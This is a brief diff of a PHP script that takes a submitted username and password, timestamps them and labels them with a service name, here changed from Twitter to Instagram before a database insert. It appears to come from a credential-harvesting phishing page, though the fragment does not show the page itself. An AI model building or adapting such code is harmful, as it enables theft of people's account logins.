@@ -16,7 +16,7 @@ if ($conn->connect_error) {
 // Get form data
 $user = $_POST['username'];
 $pass = $_POST['password'];
-$service = "Twitter";
+$service = "Instagram";
 $timestamp = date('Y-m-d H:i:s');
 
 // Prepare and bind
